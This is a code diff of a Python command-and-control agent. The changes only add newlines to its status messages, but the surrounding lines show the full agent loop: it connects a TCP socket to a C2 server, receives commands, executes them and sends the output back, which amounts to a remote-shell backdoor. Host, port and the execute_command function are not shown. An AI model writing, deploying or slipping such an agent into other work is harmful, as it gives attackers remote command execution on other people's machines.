@@ -15,7 +15,7 @@ def main():
     try:
         agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         agent_socket.connect((host, port))
-        print("Connected to C2 server")
+        print("\nConnected to C2 server")
 
         while True:
             command = agent_socket.recv(4096).decode().strip()
@@ -26,10 +26,10 @@ def main():
             output = execute_command(command)
             agent_socket.send(output.encode())
 
-        print("Closing connection to C2 server")
+        print("\nClosing connection to C2 server")
         agent_socket.close()
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"\nError: {e}")
 
 if __name__ == "__main__":
     main()
